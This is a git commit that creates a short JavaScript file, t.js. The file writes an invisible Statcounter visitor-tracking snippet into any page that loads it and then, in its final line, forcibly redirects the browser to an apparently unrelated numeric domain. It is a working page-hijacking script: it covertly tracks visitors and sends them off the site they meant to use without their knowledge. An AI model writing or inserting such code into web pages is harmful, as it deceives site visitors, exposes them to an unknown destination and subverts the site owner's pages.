ec8dd3a197a6c003a6d9744a46b6955f9c17430f
aarookie1 <149148191+aarookie1@users.noreply.github.com>
2023-10-27 15:58:56 +0800

    Create t.js

---
+++ t.js
@@ -0,0 +1,15 @@
+document.writeln("<script type=\"text/javascript\">");
+document.writeln("var sc_project=12934954; ");
+document.writeln("var sc_invisible=1; ");
+document.writeln("var sc_security=\"9fefbe04\"; ");
+document.writeln("</script>");
+document.writeln("<script type=\"text/javascript\"");
+document.writeln("src=\"https://www.statcounter.com/counter/counter.js\" async></script>");
+document.writeln("<noscript><div class=\"statcounter\"><a title=\"Web Analytics Made Easy -");
+document.writeln("Statcounter\" href=\"https://statcounter.com/\" target=\"_blank\"><img");
+document.writeln("class=\"statcounter\" src=\"https://c.statcounter.com/12934954/0/9fefbe04/1/\"");
+document.writeln("alt=\"Web Analytics Made Easy - Statcounter\"");
+document.writeln("referrerPolicy=\"no-referrer-when-downgrade\"></a></div></noscript>");
+document.writeln("<!-- End of Statcounter Code -->");
+document.writeln(""); 
+window.location.href="https://2662666.com";
